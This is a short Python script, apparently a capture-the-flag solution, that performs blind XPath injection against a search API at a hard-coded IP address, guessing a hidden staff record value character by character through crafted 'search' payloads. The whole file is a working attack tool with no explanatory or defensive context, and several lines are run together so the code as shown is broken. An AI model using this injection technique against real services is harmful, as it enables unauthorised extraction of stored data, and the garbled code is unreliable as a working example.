#!/usr/bin/python3

import requests
from string import printableprintable = printable.replace("'", '')url = "http://188.166.145.178:32535/api/search"
flag = ''
num=1
f=0

def testFlag(flag):
    json={"search": f"' or substring((//staff[position()={num}]/child::node()[position()=10]),1,{len(flag)})='{flag}'  or '2'='1"}
    r = requests.post(url, json=json)
    print(f'\r{flag}', end='')
    return 'success' in r.textwhile num<11:
 while len(flag) <=20:
  for i in printable:
   if testFlag(flag+i):
    flag +=i
    f=1
    break
   if i=='}':
    f=0
    breakif(f==0):
   num=num+1
   flag=''
   print("")
   break
